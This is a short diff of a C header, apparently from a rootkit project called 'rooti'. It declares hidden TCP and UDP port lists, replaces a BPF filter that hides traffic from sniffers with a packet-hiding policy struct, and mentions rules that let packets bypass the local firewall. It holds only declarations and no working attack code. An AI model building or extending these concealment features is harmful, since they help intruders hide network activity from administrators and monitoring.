@@ -29,10 +29,8 @@ extern const size_t ROOTI_HIDDEN_TCP_PORTS_COUNT;
 extern const unsigned short ROOTI_HIDDEN_UDP_PORTS[];
 extern const size_t ROOTI_HIDDEN_UDP_PORTS_COUNT;
 
-// BPF program for filtering out hidden network traffic from sniffers
-// The program can be obtained by executing: tcpdump -dd '<filter>'
-extern struct sock_filter ROOTI_BPF_FILTER_PROGRAM[];
-extern const size_t ROOTI_BPF_FILTER_PROGRAM_COUNT;
+// Set of network rules that define which packets should be hidden from sniffers.
+extern const struct rooti_net_policy ROOTI_PCAP_POLICY;
 
 // Set of network rules that define which packets should bypass the local firewall.
 // These rules will apply regardless of any other netfilter hooks installed.
